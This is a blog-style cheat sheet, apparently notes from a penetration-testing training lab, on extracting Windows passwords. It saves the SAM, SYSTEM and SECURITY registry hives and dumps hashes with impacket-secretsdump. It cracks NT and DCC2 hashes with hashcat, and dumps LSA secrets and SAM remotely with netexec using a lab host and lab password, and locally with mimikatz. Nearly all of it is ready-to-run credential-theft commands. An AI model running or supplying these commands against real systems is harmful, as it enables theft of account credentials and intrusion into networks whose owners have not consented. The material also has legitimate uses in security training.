---
title: Extracting Passwords from Windows Registry.
date: 2025-11-25 14:25:41

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Dump-Passwords

tags:
  - Dump-SAM

cover: /img/windows-registry.png
top_img: /img/bg-img.jpg
description: Extract passwords from windows SAM,SYSTEM AND SECURITY.
---

## Dump SAM, SYSTEM, And SECURITY

### Offline 

#### Copy Registry

Key Registry Hives:

- HKLM\SAM - Contains local user password hashes

- HKLM\SYSTEM - Contains boot key to decrypt SAM

- HKLM\SECURITY - Contains cached domain credentials & LSA secrets


```powershell
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

#### Secretsdump

##### Dump hash

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

##### Crack NT hash

```bash
sudo hashcat -m 1000 hash.txt rockyou.txt
```

##### Crack DCC2 hashes

➜ Local cache of a domain user's password, used by Windows to allow login when the Domain Controller is unavailable.

```bash
hashcat -m 2100 hash rockyou.txt
```

➜ This type of hash cannot be used for lateral movement with techniques like Pass-the-Hash.


### Remotely
##### netexec

With `local administrator privileges` we can dump lsa and sam over the network.

➜ Dump lsa.

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

➜ Dump sam.

```bash
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
### Locally

##### mimikatz


```bash
mimikatz.exe

mimikatz # privilege::debug

mimikatz # lsadump::sam
```